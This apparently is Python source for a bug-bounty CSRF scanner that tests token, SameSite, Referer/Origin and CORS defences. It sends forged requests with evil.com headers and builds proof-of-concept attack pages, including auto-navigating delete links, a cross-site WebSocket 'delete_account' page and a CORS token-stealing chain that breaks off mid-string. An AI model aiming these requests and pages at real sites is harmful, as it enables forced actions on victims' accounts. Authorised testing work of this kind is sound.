"""
CSRF Tester Agent

Advanced Cross-Site Request Forgery (CSRF) testing agent that identifies
CSRF protection misconfigurations and bypass techniques.

This agent tests for:
- Missing CSRF tokens
- Token validation bypass (empty, reuse, fixation, regex-only)
- SameSite cookie bypass techniques
- Referrer/Origin validation bypass
- CORS + CSRF attack chains
- Method override (POST → GET)
- Double-submit cookie validation
- Content-Type based CSRF
- WebSocket CSRF

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import time
import hashlib
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse, quote
from dataclasses import dataclass, field
from datetime import date
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from colorama import Fore, Style
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Fallback to empty strings
    class Fore:
        CYAN = RED = YELLOW = GREEN = ""
    class Style:
        RESET_ALL = ""

# Database integration
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks


class CSRFSeverity(Enum):
    """CSRF vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class CSRFVulnType(Enum):
    """Types of CSRF vulnerabilities."""
    MISSING_TOKEN = "CSRF_MISSING_TOKEN"
    EMPTY_TOKEN = "CSRF_EMPTY_TOKEN"
    TOKEN_REUSE = "CSRF_TOKEN_REUSE"
    TOKEN_FIXATION = "CSRF_TOKEN_FIXATION"
    METHOD_OVERRIDE = "CSRF_METHOD_OVERRIDE"
    REGEX_BYPASS = "CSRF_REGEX_BYPASS"
    SAMESITE_NONE = "CSRF_SAMESITE_NONE"
    SAMESITE_LAX_BYPASS = "CSRF_SAMESITE_LAX_BYPASS"
    WEBSOCKET_CSRF = "CSRF_WEBSOCKET"
    NULL_REFERRER = "CSRF_NULL_REFERRER"
    SUBDOMAIN_BYPASS = "CSRF_SUBDOMAIN_BYPASS"
    REGEX_REFERRER_BYPASS = "CSRF_REGEX_REFERRER_BYPASS"
    CORS_CSRF_CHAIN = "CSRF_CORS_CHAIN"
    CONTENT_TYPE_BYPASS = "CSRF_CONTENT_TYPE"
    ORIGIN_INCONSISTENT = "CSRF_ORIGIN_INCONSISTENT"


@dataclass
class CSRFFinding:
    """Represents a CSRF security finding."""
    title: str
    severity: CSRFSeverity
    vuln_type: CSRFVulnType
    description: str
    endpoint: str
    payload: str = ""
    poc_html: str = ""
    poc_curl: str = ""
    impact: str = ""
    recommendation: str = ""
    evidence: Dict[str, Any] = field(default_factory=dict)
    cwe_id: Optional[str] = None
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = {
            'title': self.title,
            'severity': self.severity.value,
            'vuln_type': self.vuln_type.value,
            'description': self.description,
            'endpoint': self.endpoint,
            'payload': self.payload,
            'poc_html': self.poc_html,
            'poc_curl': self.poc_curl,
            'impact': self.impact,
            'recommendation': self.recommendation,
            'evidence': self.evidence,
            'cwe_id': self.cwe_id,
            'discovered_date': self.discovered_date
        }
        return data


@dataclass
class CSRFProtection:
    """CSRF protection mechanisms detected."""
    has_csrf_token: bool = False
    token_value: Optional[str] = None
    token_field: Optional[str] = None
    token_entropy: float = 0.0
    has_samesite: bool = False
    samesite_value: Optional[str] = None
    has_referrer_check: bool = False
    has_origin_check: bool = False
    has_custom_header: bool = False
    custom_headers: List[str] = field(default_factory=list)
    has_double_submit: bool = False
    cookies: List[Dict[str, Any]] = field(default_factory=list)


class CSRFTester:
    """
    Advanced CSRF Security Tester.

    Performs comprehensive CSRF vulnerability testing including:
    - Token validation bypass
    - SameSite cookie bypass
    - Referrer/Origin validation bypass
    - CORS + CSRF chains
    - Method override attacks

    Usage:
        tester = CSRFTester(target_url="https://example.com/api/delete", method="POST")
        findings = tester.run_all_tests()
    """

    def __init__(self, target_url: str, method: str = "POST",
                 form_data: Optional[Dict] = None,
                 target: Optional[str] = None,
                 session: Optional[requests.Session] = None,
                 timeout: int = 10,
                 verify_ssl: bool = True):
        """
        Initialize the CSRF Tester.

        Args:
            target_url: Target endpoint URL
            method: HTTP method (POST, PUT, DELETE, PATCH)
            form_data: Form data to submit (if known)
            target: Target identifier for database tracking
            session: Existing session with cookies
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.target_url = target_url.rstrip('/')
        self.method = method.upper()
        self.form_data = form_data or {}
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = session or requests.Session()
        self.findings: List[CSRFFinding] = []
        self.protection: Optional[CSRFProtection] = None

        # Extract domain from URL
        parsed = urlparse(target_url)
        self.domain = parsed.netloc
        self.scheme = parsed.scheme

        # Target for database tracking
        if target:
            self.target = target
        else:
            self.target = self.domain

        # Test counters
        self.tests_run = 0
        self.tests_passed = 0

    def run_all_tests(self) -> List[CSRFFinding]:
        """
        Run all CSRF security tests.

        Returns:
            List of all findings discovered
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'csrf_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting comprehensive CSRF testing...{Style.RESET_ALL}")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Method: {self.method}")

        # Phase 1: Detect CSRF protections
        print(f"\n{Fore.YELLOW}[PHASE 1] Detecting CSRF protections...{Style.RESET_ALL}")
        self.protection = self._detect_csrf_protection()
        self._print_protection_summary()

        # Phase 2: Test token bypasses
        print(f"\n{Fore.YELLOW}[PHASE 2] Testing token bypass techniques...{Style.RESET_ALL}")
        self._test_token_bypasses()

        # Phase 3: Test SameSite bypasses
        print(f"\n{Fore.YELLOW}[PHASE 3] Testing SameSite cookie bypasses...{Style.RESET_ALL}")
        self._test_samesite_bypasses()

        # Phase 4: Test referrer/origin bypasses
        print(f"\n{Fore.YELLOW}[PHASE 4] Testing Referrer/Origin bypasses...{Style.RESET_ALL}")
        self._test_referrer_origin_bypasses()

        # Phase 5: Test CORS + CSRF chains
        print(f"\n{Fore.YELLOW}[PHASE 5] Testing CORS + CSRF chains...{Style.RESET_ALL}")
        self._test_cors_csrf_chains()

        # Phase 6: Test content-type based CSRF
        print(f"\n{Fore.YELLOW}[PHASE 6] Testing Content-Type based CSRF...{Style.RESET_ALL}")
        self._test_content_type_csrf()

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'csrf_tester',
            findings_count=len(self.findings),
            duration_seconds=0,
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in [CSRFSeverity.CRITICAL, CSRFSeverity.HIGH]:
                PayloadHooks.record_payload_success(
                    payload_text=finding.payload,
                    vuln_type='CSRF',
                    context=finding.vuln_type.value,
                    notes=finding.title
                )

        print(f"\n{Fore.CYAN}=== CSRF TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Tests run: {self.tests_run}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    def _detect_csrf_protection(self) -> CSRFProtection:
        """
        Comprehensive CSRF protection detection.

        Returns:
            CSRFProtection object with detected mechanisms
        """
        protection = CSRFProtection()

        try:
            # Fetch the page to detect protections
            response = self.session.get(self.target_url, timeout=self.timeout, verify=self.verify_ssl)

            # Detect CSRF tokens
            token_info = self._detect_csrf_token(response.text)
            if token_info:
                protection.has_csrf_token = True
                protection.token_value = token_info['token']
                protection.token_field = token_info['field']
                protection.token_entropy = token_info['entropy']

            # Detect SameSite cookies
            samesite_info = self._detect_samesite(response)
            if samesite_info:
                protection.has_samesite = True
                protection.samesite_value = samesite_info['value']
                protection.cookies = samesite_info['cookies']

            # Detect referrer validation
            protection.has_referrer_check = self._detect_referrer_validation()

            # Detect origin validation
            protection.has_origin_check = self._detect_origin_validation()

            # Detect custom headers
            custom_headers = self._detect_custom_headers()
            if custom_headers:
                protection.has_custom_header = True
                protection.custom_headers = custom_headers

            # Detect double-submit cookie
            protection.has_double_submit = self._detect_double_submit(response, token_info)

        except Exception as e:
            print(f"  Error detecting protections: {e}")

        return protection

    def _detect_csrf_token(self, html: str) -> Optional[Dict]:
        """Detect CSRF tokens in forms and meta tags."""
        # Common CSRF token patterns
        token_patterns = [
            (r'<input[^>]*name=["\']([^"\']*csrf[^"\']*)["\'][^>]*value=["\']([^"\']+)', 'input-csrf'),
            (r'<input[^>]*name=["\']([^"\']*token[^"\']*)["\'][^>]*value=["\']([^"\']+)', 'input-token'),
            (r'<input[^>]*name=["\'](_token)["\'][^>]*value=["\']([^"\']+)', 'input-_token'),
            (r'<input[^>]*name=["\'](authenticity_token)["\'][^>]*value=["\']([^"\']+)', 'input-auth'),
            (r'<meta[^>]*name=["\']([^"\']*csrf[^"\']*)["\'][^>]*content=["\']([^"\']+)', 'meta-csrf'),
            (r'"csrf":\s*"([^"]+)"', 'json-csrf'),
            (r'"csrfToken":\s*"([^"]+)"', 'json-csrfToken'),
        ]

        for pattern, pattern_type in token_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                groups = match.groups()
                if len(groups) == 2:
                    field_name, token_value = groups
                else:
                    field_name = 'csrf'
                    token_value = groups[0]

                return {
                    'token': token_value,
                    'field': field_name,
                    'pattern': pattern_type,
                    'length': len(token_value),
                    'entropy': self._calculate_entropy(token_value)
                }

        return None

    def _detect_samesite(self, response: requests.Response) -> Optional[Dict]:
        """Detect SameSite cookie attributes."""
        set_cookie_headers = response.headers.get_list('Set-Cookie') if hasattr(response.headers, 'get_list') else [response.headers.get('Set-Cookie', '')]

        samesite_cookies = []
        detected_value = None

        for cookie_header in set_cookie_headers:
            if not cookie_header:
                continue

            # Parse SameSite attribute
            samesite_match = re.search(r'SameSite=(\w+)', cookie_header, re.IGNORECASE)
            if samesite_match:
                samesite_value = samesite_match.group(1)
                detected_value = samesite_value

                # Extract cookie name
                cookie_name = cookie_header.split('=')[0].strip()

                # Check for Secure and HttpOnly
                is_secure = 'Secure' in cookie_header
                is_httponly = 'HttpOnly' in cookie_header

                samesite_cookies.append({
                    'name': cookie_name,
                    'samesite': samesite_value,
                    'secure': is_secure,
                    'httponly': is_httponly
                })

        if samesite_cookies:
            return {
                'value': detected_value,
                'cookies': samesite_cookies
            }

        return None

    def _detect_referrer_validation(self) -> bool:
        """Test if referrer validation is present."""
        try:
            # Test with missing referrer
            response_no_ref = self.session.request(
                self.method,
                self.target_url,
                headers={'Referer': ''},
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )

            # Test with external referrer
            response_ext_ref = self.session.request(
                self.method,
                self.target_url,
                headers={'Referer': 'https://evil.com/'},
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )

            # If both return 403/400, referrer validation likely present
            return (
                response_no_ref.status_code in [400, 403] or
                response_ext_ref.status_code in [400, 403]
            )
        except Exception:
            return False

    def _detect_origin_validation(self) -> bool:
        """Test if Origin header validation is present."""
        try:
            response = self.session.request(
                self.method,
                self.target_url,
                headers={'Origin': 'https://evil.com'},
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )

            return response.status_code in [400, 403]
        except Exception:
            return False

    def _detect_custom_headers(self) -> List[str]:
        """Detect custom anti-CSRF headers."""
        custom_headers = []

        # Common custom header patterns
        test_headers = [
            'X-Requested-With',
            'X-CSRF-Token',
            'X-XSRF-Token',
        ]

        for header in test_headers:
            try:
                # Test without header
                response_without = self.session.request(
                    self.method,
                    self.target_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                # Test with header
                response_with = self.session.request(
                    self.method,
                    self.target_url,
                    headers={header: 'XMLHttpRequest'},
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                if response_without.status_code != response_with.status_code:
                    custom_headers.append(header)
            except Exception:
                pass

        return custom_headers

    def _detect_double_submit(self, response: requests.Response, token_info: Optional[Dict]) -> bool:
        """Detect double-submit cookie pattern."""
        if not token_info:
            return False

        # Look for CSRF token in cookies
        for cookie in response.cookies:
            if 'csrf' in cookie.name.lower() or 'xsrf' in cookie.name.lower():
                # Check if cookie value matches token
                if cookie.value == token_info['token']:
                    return True

        return False

    def _calculate_entropy(self, token: str) -> float:
        """Calculate Shannon entropy of token."""
        if not token:
            return 0.0

        import math
        entropy = 0
        for x in range(256):
            p_x = token.count(chr(x)) / len(token)
            if p_x > 0:
                entropy += -p_x * math.log2(p_x)

        return entropy

    def _print_protection_summary(self):
        """Print detected CSRF protections."""
        if not self.protection:
            return

        print(f"  CSRF Token:        {'✓ DETECTED' if self.protection.has_csrf_token else '✗ NOT DETECTED'}")
        if self.protection.has_csrf_token:
            print(f"    Field: {self.protection.token_field}")
            print(f"    Length: {len(self.protection.token_value or '')}")
            print(f"    Entropy: {self.protection.token_entropy:.2f} bits")

        print(f"  SameSite Cookie:   {'✓ DETECTED' if self.protection.has_samesite else '✗ NOT DETECTED'}")
        if self.protection.has_samesite:
            print(f"    Value: {self.protection.samesite_value}")

        print(f"  Referrer Check:    {'✓ DETECTED' if self.protection.has_referrer_check else '✗ NOT DETECTED'}")
        print(f"  Origin Check:      {'✓ DETECTED' if self.protection.has_origin_check else '✗ NOT DETECTED'}")
        print(f"  Custom Headers:    {'✓ DETECTED' if self.protection.has_custom_header else '✗ NOT DETECTED'}")
        if self.protection.custom_headers:
            print(f"    Headers: {', '.join(self.protection.custom_headers)}")
        print(f"  Double Submit:     {'✓ DETECTED' if self.protection.has_double_submit else '✗ NOT DETECTED'}")

    def _test_token_bypasses(self):
        """Test CSRF token validation bypass techniques."""
        if not self.protection or not self.protection.has_csrf_token:
            print("  No CSRF token detected, skipping token bypass tests")
            return

        self._test_missing_token()
        self._test_empty_token()
        self._test_token_reuse()
        self._test_method_override()
        self._test_regex_bypass()
        self._test_token_fixation()

    def _test_missing_token(self):
        """Test if request works without CSRF token."""
        print("  Testing missing token...")
        self.tests_run += 1

        # Remove CSRF token from form data
        modified_data = self.form_data.copy()
        csrf_keys = [k for k in modified_data.keys() if 'csrf' in k.lower() or 'token' in k.lower()]

        for key in csrf_keys:
            del modified_data[key]

        response = self._make_request(data=modified_data)

        if response and self._is_successful(response):
            finding = CSRFFinding(
                title="CSRF Token Bypass - Missing Token",
                severity=CSRFSeverity.HIGH,
                vuln_type=CSRFVulnType.MISSING_TOKEN,
                description="State-changing request succeeds without CSRF token",
                endpoint=self.target_url,
                payload=str(modified_data),
                poc_html=self._generate_form_poc(modified_data),
                poc_curl=self._generate_curl_poc(modified_data),
                impact="Attacker can perform actions on behalf of victim without token",
                recommendation="Implement CSRF token validation on all state-changing endpoints",
                evidence={'response_code': response.status_code, 'data': modified_data},
                cwe_id="CWE-352"
            )
            self.findings.append(finding)
            self.tests_passed += 1
            print(f"    {Fore.RED}🚨 VULNERABLE: Missing token accepted!{Style.RESET_ALL}")

    def _test_empty_token(self):
        """Test if empty token value is accepted."""
        print("  Testing empty token...")
        self.tests_run += 1

        modified_data = self.form_data.copy()
        if self.protection.token_field:
            modified_data[self.protection.token_field] = ''

        response = self._make_request(data=modified_data)

        if response and self._is_successful(response):
            finding = CSRFFinding(
                title="CSRF Token Bypass - Empty Token",
                severity=CSRFSeverity.HIGH,
                vuln_type=CSRFVulnType.EMPTY_TOKEN,
                description="State-changing request succeeds with empty CSRF token",
                endpoint=self.target_url,
                payload=str(modified_data),
                poc_html=self._generate_form_poc(modified_data),
                poc_curl=self._generate_curl_poc(modified_data),
                impact="Attacker can bypass CSRF protection with empty token",
                recommendation="Validate that CSRF token is non-empty before processing",
                evidence={'response_code': response.status_code},
                cwe_id="CWE-352"
            )
            self.findings.append(finding)
            self.tests_passed += 1
            print(f"    {Fore.RED}🚨 VULNERABLE: Empty token accepted!{Style.RESET_ALL}")

    def _test_token_reuse(self):
        """Test if token can be reused across sessions."""
        print("  Testing token reuse...")
        self.tests_run += 1

        if not self.protection.token_value:
            return

        # Use token from current session in new session
        new_session = requests.Session()
        modified_data = self.form_data.copy()
        if self.protection.token_field:
            modified_data[self.protection.token_field] = self.protection.token_value

        try:
            response = new_session.request(
                self.method,
                self.target_url,
                data=modified_data,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if self._is_successful(response):
                finding = CSRFFinding(
                    title="CSRF Token Bypass - Token Reuse",
                    severity=CSRFSeverity.MEDIUM,
                    vuln_type=CSRFVulnType.TOKEN_REUSE,
                    description="CSRF token can be reused across different sessions",
                    endpoint=self.target_url,
                    payload=self.protection.token_value,
                    poc_html=f"1. Get token from Session A\n2. Use token in Session B\n3. Request succeeds",
                    impact="Attacker can steal a valid token and reuse it in different session",
                    recommendation="Bind CSRF tokens to user session. Invalidate on logout.",
                    evidence={'response_code': response.status_code},
                    cwe_id="CWE-352"
                )
                self.findings.append(finding)
                self.tests_passed += 1
                print(f"    {Fore.RED}🚨 VULNERABLE: Token reuse across sessions!{Style.RESET_ALL}")
        except Exception:
            pass

    def _test_method_override(self):
        """Test POST to GET method override."""
        print("  Testing method override (POST→GET)...")
        self.tests_run += 1

        # Try GET request with POST parameters
        try:
            response = self.session.get(
                self.target_url,
                params=self.form_data,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if self._is_successful(response):
                finding = CSRFFinding(
                    title="CSRF Token Bypass - Method Override",
                    severity=CSRFSeverity.HIGH,
                    vuln_type=CSRFVulnType.METHOD_OVERRIDE,
                    description="State-changing action can be triggered via GET request",
                    endpoint=self.target_url,
                    payload=f"GET {self.target_url}?{self._dict_to_query(self.form_data)}",
                    poc_html=f'<a href="{self.target_url}?{self._dict_to_query(self.form_data)}">Click me</a>',
                    poc_curl=f"curl '{self.target_url}?{self._dict_to_query(self.form_data)}'",
                    impact="Attacker can trigger action via simple link (no form submission needed)",
                    recommendation="Never allow GET requests for state-changing actions",
                    evidence={'response_code': response.status_code},
                    cwe_id="CWE-352"
                )
                self.findings.append(finding)
                self.tests_passed += 1
                print(f"    {Fore.RED}🚨 VULNERABLE: POST→GET override works!{Style.RESET_ALL}")
        except Exception:
            pass

    def _test_regex_bypass(self):
        """Test regex validation bypass (length-only checks)."""
        print("  Testing regex bypass...")
        self.tests_run += 1

        if not self.protection.token_value or not self.protection.token_field:
            return

        # Generate token of same length but different value
        fake_token = 'A' * len(self.protection.token_value)
        modified_data = self.form_data.copy()
        modified_data[self.protection.token_field] = fake_token

        response = self._make_request(data=modified_data)

        if response and self._is_successful(response):
            finding = CSRFFinding(
                title="CSRF Token Bypass - Regex/Length Only Validation",
                severity=CSRFSeverity.HIGH,
                vuln_type=CSRFVulnType.REGEX_BYPASS,
                description="CSRF validation only checks token length, not actual value",
                endpoint=self.target_url,
                payload=fake_token,
                poc_html=self._generate_form_poc(modified_data),
                poc_curl=self._generate_curl_poc(modified_data),
                impact="Attacker can bypass CSRF protection with any token of correct length",
                recommendation="Validate token value against server-stored value, not just format",
                evidence={'fake_token': fake_token, 'response_code': response.status_code},
                cwe_id="CWE-352"
            )
            self.findings.append(finding)
            self.tests_passed += 1
            print(f"    {Fore.RED}🚨 VULNERABLE: Length-only validation!{Style.RESET_ALL}")

    def _test_token_fixation(self):
        """Test if attacker can fix CSRF token."""
        print("  Testing token fixation...")
        self.tests_run += 1

        # Set custom CSRF token in cookie
        self.session.cookies.set('csrf_token', 'attacker_controlled_token')

        modified_data = self.form_data.copy()
        if self.protection.token_field:
            modified_data[self.protection.token_field] = 'attacker_controlled_token'

        response = self._make_request(data=modified_data)

        if response and self._is_successful(response):
            finding = CSRFFinding(
                title="CSRF Token Fixation",
                severity=CSRFSeverity.HIGH,
                vuln_type=CSRFVulnType.TOKEN_FIXATION,
                description="Attacker can set CSRF token value before victim uses it",
                endpoint=self.target_url,
                payload='attacker_controlled_token',
                poc_html='1. Set-Cookie: csrf_token=attacker_value\n2. Victim submits form\n3. Request succeeds',
                impact="Attacker can fix token value and bypass CSRF protection",
                recommendation="Generate CSRF token server-side, don't accept client-provided tokens",
                evidence={'response_code': response.status_code},
                cwe_id="CWE-352"
            )
            self.findings.append(finding)
            self.tests_passed += 1
            print(f"    {Fore.RED}🚨 VULNERABLE: Token fixation possible!{Style.RESET_ALL}")

    def _test_samesite_bypasses(self):
        """Test SameSite cookie bypass techniques."""
        if not self.protection or not self.protection.has_samesite:
            print("  No SameSite cookies detected, generating PoCs for common scenarios")

        # Always generate PoCs for different scenarios
        self._generate_samesite_none_poc()
        self._generate_lax_bypass_poc()
        self._generate_websocket_poc()

    def _generate_samesite_none_poc(self):
        """Generate PoC for SameSite=None."""
        if self.protection and self.protection.samesite_value == 'None':
            finding = CSRFFinding(
                title="CSRF via SameSite=None Cookie",
                severity=CSRFSeverity.HIGH,
                vuln_type=CSRFVulnType.SAMESITE_NONE,
                description="Session cookie has SameSite=None, allowing cross-site requests",
                endpoint=self.target_url,
                poc_html=self._generate_form_poc(self.form_data, title="CSRF PoC - SameSite=None"),
                impact="Full CSRF attack possible from attacker-controlled domain",
                recommendation="Use SameSite=Strict or SameSite=Lax instead of None",
                evidence={'samesite': 'None'},
                cwe_id="CWE-352"
            )
            self.findings.append(finding)
            print(f"  {Fore.YELLOW}⚠ SameSite=None enables CSRF attacks{Style.RESET_ALL}")

    def _generate_lax_bypass_poc(self):
        """Generate PoC for SameSite=Lax bypass via top-level navigation."""
        poc_html = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC - SameSite=Lax Bypass</title></head>
<body>
<h1>Click to continue</h1>
<a href="{self.target_url}?action=delete">Continue</a>
<script>
    // Auto-navigate after 2 seconds
    setTimeout(() => {{
        window.location = '{self.target_url}?action=delete';
    }}, 2000);
</script>
</body>
</html>"""

        finding = CSRFFinding(
            title="CSRF via SameSite=Lax Top-Level Navigation",
            severity=CSRFSeverity.MEDIUM,
            vuln_type=CSRFVulnType.SAMESITE_LAX_BYPASS,
            description="SameSite=Lax cookies sent on top-level GET navigation",
            endpoint=self.target_url,
            poc_html=poc_html,
            impact="CSRF possible if state-changing actions accept GET requests",
            recommendation="Use POST for state-changing actions, not GET",
            evidence={'samesite': self.protection.samesite_value if self.protection else 'Lax'},
            cwe_id="CWE-352"
        )
        self.findings.append(finding)

    def _generate_websocket_poc(self):
        """Generate PoC for WebSocket-based SameSite bypass."""
        ws_url = self.target_url.replace('https://', 'wss://').replace('http://', 'ws://')

        poc_html = f"""<!DOCTYPE html>
<html>
<head><title>WebSocket CSRF PoC</title></head>
<body>
<h1>WebSocket CSRF</h1>
<script>
    const ws = new WebSocket('{ws_url}');

    ws.onopen = () => {{
        // Cookies are sent with WebSocket handshake
        ws.send(JSON.stringify({{
            action: 'delete_account'
        }}));
    }};

    ws.onmessage = (event) => {{
        console.log('Response:', event.data);
    }};
</script>
</body>
</html>"""

        finding = CSRFFinding(
            title="CSRF via WebSocket (SameSite bypass)",
            severity=CSRFSeverity.HIGH,
            vuln_type=CSRFVulnType.WEBSOCKET_CSRF,
            description="WebSocket connections bypass SameSite cookie restrictions",
            endpoint=ws_url,
            poc_html=poc_html,
            impact="WebSocket handshake includes cookies regardless of SameSite",
            recommendation="Validate Origin header on WebSocket connections",
            evidence={'websocket_url': ws_url},
            cwe_id="CWE-352"
        )
        self.findings.append(finding)

    def _test_referrer_origin_bypasses(self):
        """Test Referrer and Origin validation bypass."""
        self._test_null_referrer()
        self._test_subdomain_bypass()
        self._test_regex_referrer_bypass()
        self._test_origin_vs_referrer()

    def _test_null_referrer(self):
        """Test null referrer bypass."""
        print("  Testing null referrer...")
        self.tests_run += 1

        try:
            response = self.session.request(
                self.method,
                self.target_url,
                headers={'Referer': ''},
                data=self.form_data,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if self._is_successful(response):
                poc_html = f"""<!DOCTYPE html>
<html>
<head>
<meta name="referrer" content="no-referrer">
<title>CSRF PoC - Null Referrer</title>
</head>
<body>
{self._generate_form_html(self.form_data)}
</body>
</html>"""

                finding = CSRFFinding(
                    title="CSRF via Null Referrer Bypass",
                    severity=CSRFSeverity.HIGH,
                    vuln_type=CSRFVulnType.NULL_REFERRER,
                    description="Application accepts requests with null/missing referrer",
                    endpoint=self.target_url,
                    poc_html=poc_html,
                    impact="Attacker can bypass referrer validation using meta tag",
                    recommendation="Reject requests with null referrer or use stronger validation",
                    evidence={'response_code': response.status_code},
                    cwe_id="CWE-352"
                )
                self.findings.append(finding)
                self.tests_passed += 1
                print(f"    {Fore.RED}🚨 VULNERABLE: Null referrer accepted!{Style.RESET_ALL}")
        except Exception:
            pass

    def _test_subdomain_bypass(self):
        """Test subdomain referrer bypass."""
        print("  Testing subdomain bypass...")

        # Test with evil subdomain
        fake_subdomains = [
            f'https://evil.{self.domain}',
            f'https://{self.domain}.evil.com',
        ]

        for fake_ref in fake_subdomains:
            self.tests_run += 1

            try:
                response = self.session.request(
                    self.method,
                    self.target_url,
                    headers={'Referer': fake_ref},
                    data=self.form_data,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                if self._is_successful(response):
                    finding = CSRFFinding(
                        title="CSRF via Subdomain Referrer Bypass",
                        severity=CSRFSeverity.HIGH,
                        vuln_type=CSRFVulnType.SUBDOMAIN_BYPASS,
                        description=f"Weak referrer validation accepts: {fake_ref}",
                        endpoint=self.target_url,
                        payload=fake_ref,
                        poc_curl=f"curl -X {self.method} '{self.target_url}' -H 'Referer: {fake_ref}'",
                        impact="Attacker can bypass referrer validation with crafted domain",
                        recommendation="Use exact domain matching, not substring matching",
                        evidence={'fake_referrer': fake_ref, 'response_code': response.status_code},
                        cwe_id="CWE-352"
                    )
                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"    {Fore.RED}🚨 VULNERABLE: {fake_ref} accepted!{Style.RESET_ALL}")
            except Exception:
                pass

    def _test_regex_referrer_bypass(self):
        """Test regex validation bypass patterns."""
        print("  Testing regex bypass...")

        # Common regex bypass patterns
        bypass_patterns = [
            f'https://{self.domain}@evil.com',
            f'https://evil.com/{self.domain}',
            f'https://evil.com?{self.domain}',
            f'https://evil.com#{self.domain}',
        ]

        for pattern in bypass_patterns:
            self.tests_run += 1

            try:
                response = self.session.request(
                    self.method,
                    self.target_url,
                    headers={'Referer': pattern},
                    data=self.form_data,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                if self._is_successful(response):
                    finding = CSRFFinding(
                        title="CSRF via Regex Bypass",
                        severity=CSRFSeverity.HIGH,
                        vuln_type=CSRFVulnType.REGEX_REFERRER_BYPASS,
                        description=f"Referrer validation regex bypassed with: {pattern}",
                        endpoint=self.target_url,
                        payload=pattern,
                        poc_curl=f"curl -X {self.method} '{self.target_url}' -H 'Referer: {pattern}'",
                        impact="Weak regex allows attacker-controlled domains",
                        recommendation="Use exact matching with proper anchors (^ and $)",
                        evidence={'bypass_pattern': pattern, 'response_code': response.status_code},
                        cwe_id="CWE-352"
                    )
                    self.findings.append(finding)
                    self.tests_passed += 1
                    print(f"    {Fore.RED}🚨 VULNERABLE: Regex bypass with {pattern}!{Style.RESET_ALL}")
            except Exception:
                pass

    def _test_origin_vs_referrer(self):
        """Test inconsistent Origin vs Referrer validation."""
        print("  Testing Origin vs Referrer consistency...")
        self.tests_run += 1

        try:
            response = self.session.request(
                self.method,
                self.target_url,
                headers={
                    'Origin': 'https://evil.com',
                    'Referer': ''
                },
                data=self.form_data,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            if self._is_successful(response):
                finding = CSRFFinding(
                    title="Inconsistent Origin/Referrer Validation",
                    severity=CSRFSeverity.MEDIUM,
                    vuln_type=CSRFVulnType.ORIGIN_INCONSISTENT,
                    description="Application checks Referrer but not Origin header",
                    endpoint=self.target_url,
                    poc_curl=f"curl -X {self.method} '{self.target_url}' -H 'Origin: https://evil.com' -H 'Referer: '",
                    impact="Origin header can bypass referrer validation",
                    recommendation="Validate both Origin and Referrer headers",
                    evidence={'response_code': response.status_code},
                    cwe_id="CWE-352"
                )
                self.findings.append(finding)
                self.tests_passed += 1
                print(f"    {Fore.RED}🚨 VULNERABLE: Origin not validated!{Style.RESET_ALL}")
        except Exception:
            pass

    def _test_cors_csrf_chains(self):
        """Test if CORS misconfiguration enables CSRF."""
        print("  Testing CORS + CSRF chain...")
        self.tests_run += 1

        try:
            response = self.session.get(
                self.target_url,
                headers={'Origin': 'https://evil.com'},
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')

            if acao and acac == 'true':
                poc_html = f"""<!DOCTYPE html>
<html>
<head><title>CORS + CSRF Chain PoC</title></head>
<body>
<h1>CORS + CSRF Attack Chain</h1>
<script>
// Step 1: Use CORS to read CSRF token
fetch('{self.target_url}', {{
    credentials: 'include'
}})
.then(r => r.text())
.then(html => {{
    // Extract CSRF token
    const match = html.match(/csrf[^"']*["']\\s*value=["']([^"']+)/i);
    const token = match ? match[1] : null;

    if (token) {{
        // Step 2: Use token in CSRF attack
        fetch('{self.target_url}', {{
            method: '{self.method}',
            credentials: 'include',
